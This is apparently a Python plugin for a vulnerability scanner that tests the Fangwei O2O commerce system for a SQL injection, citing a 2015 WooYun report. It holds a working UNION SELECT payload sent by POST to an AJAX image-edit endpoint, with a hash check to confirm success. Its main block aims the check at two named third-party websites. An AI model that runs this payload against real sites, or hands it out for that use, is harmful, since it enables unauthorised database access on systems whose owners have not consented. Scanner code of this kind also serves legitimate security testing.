#!/usr/bin/evn python 
#--coding:utf-8--*--
#Name:方维o2o商业系统sql注入
#Refer:http://www.wooyun.org/bugs/wooyun-2015-0122566



def assign(service,arg):
    if service=="fangwei":
        return True,arg 

def audit(arg):
    url=arg+"index.php?ctl=ajax&act=publish_img_edit"
    data="img_ids[1]=-1) UNION SELECT%0b1,2,3,4,5,6,7,md5(123),9,10,11,12%23"
    code,head,res,errcode,finalurl=curl.curl2(url,post=data)
    if code==200 and "202cb962ac59075b964b07152d234b70" in res:
            security_hole('sql injection: ' + arg+'index.php?ctl=ajax&act=publish_img_edit')


if  __name__ == '__main__':
    from dummy import *
    audit(assign("fangwei","http://www.7dit.com/")[1])
    audit(assign("fangwei","http://www.zxw999.com/")[1])